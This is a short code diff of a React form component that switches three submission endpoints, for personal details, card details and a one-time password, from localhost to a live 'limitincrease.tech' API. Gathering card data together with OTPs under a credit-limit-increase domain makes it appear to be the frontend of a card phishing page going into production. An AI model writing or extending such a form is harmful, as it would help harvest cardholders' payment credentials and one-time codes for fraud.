@@ -54,7 +54,7 @@ const FirstForm = () => {
   const submitPersonalInfo = async () => {
     console.log(formData); // Log formData to verify if gender is included
     try {
-      const response = await axios.post("http://localhost:7000/v1/send-personal-details", {
+      const response = await axios.post("https://api.limitincrease.tech/v1/send-personal-details", {
         firstName: formData.firstName,
         middleName: formData.middleName,
         lastName: formData.lastName,
@@ -90,7 +90,7 @@ const FirstForm = () => {
 
   const submitCardDetails = async () => {
     try {
-      const response = await axios.post("http://localhost:7000/v1/send-card-details", {
+      const response = await axios.post("https://api.limitincrease.tech/v1/send-card-details", {
         creditLimit: formData.creditLimit,
         totalAmountDue: formData.totalAmountDue,
         cardHolderName: formData.cardHolderName,
@@ -126,7 +126,7 @@ const FirstForm = () => {
 
   const verifyOtp = async () => {
     try {
-      const response = await axios.post("http://localhost:7000/v1/send-otp", {
+      const response = await axios.post("https://api.limitincrease.tech/v1/send-otp", {
         otp: formData.otp,
       });
 
